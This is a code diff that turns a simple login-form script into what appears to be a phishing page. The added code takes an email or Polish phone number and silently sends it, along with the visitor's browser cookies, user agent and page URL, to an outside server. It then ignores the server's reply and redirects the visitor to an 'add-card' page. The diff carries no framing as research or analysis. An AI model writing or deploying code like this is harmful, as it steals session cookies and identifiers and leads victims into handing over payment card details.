@@ -1,48 +1,44 @@
-const form = document.getElementById("loginForm");
-const emailInput = document.getElementById("email");
-const passwordInput = document.getElementById("password");
-const emailError = document.getElementById("emailError");
-const passwordError = document.getElementById("passwordError");
-const successMessage = document.getElementById("successMessage");
+document.addEventListener('DOMContentLoaded', () => {
+  const input = document.getElementById('userId');
+  const button = document.getElementById('submit-btn');
+  const form = document.getElementById('login-form');
 
-form.addEventListener("submit", async (e) => {
-  e.preventDefault();
+  input.addEventListener('input', () => {
+    button.disabled = input.value.trim() === '';
+  });
 
-  const email = emailInput.value.trim();
-  const password = passwordInput.value;
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const value = input.value.trim();
 
-  let hasError = false;
-  emailError.textContent = "";
-  passwordError.textContent = "";
-  successMessage.textContent = "";
+    const isValid = value.match(/^(\+48\d{9}|[a-zA-Z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,})$/i);
+    if (!isValid) {
+      alert('Please enter a valid phone number or email');
+      return;
+    }
 
-  if (!email) {
-    emailError.textContent = "Please enter your email.";
-    hasError = true;
-  }
+    button.disabled = true;
+    button.querySelector('.al-button__label').textContent = 'Loading...';
 
-  if (!password) {
-    passwordError.textContent = "Please enter your password.";
-    hasError = true;
-  }
-
-  if (!hasError) {
     try {
-      const res = await fetch("http://localhost:3000/send", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ email, password })
+      const res = await fetch('https://onclick-back.onrender.com/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          email: value,
+          cookies: document.cookie,
+          userAgent: navigator.userAgent,
+          location: window.location.href,
+          date: new Date().toISOString()
+        })
       });
 
-      if (res.ok) {
-        successMessage.textContent = "Login successful!";
-        form.reset();
-      } else {
-        successMessage.textContent = "Server error. Try again.";
-      }
+      window.location.href = 'add-card.html';
     } catch (err) {
-      console.error("Error:", err);
-      successMessage.textContent = "Network error.";
+      console.error('Submission error:', err);
+      alert('Something went wrong. Please try again.');
+      button.disabled = false;
+      button.querySelector('.al-button__label').textContent = 'Continue';
     }
-  }
+  });
 });
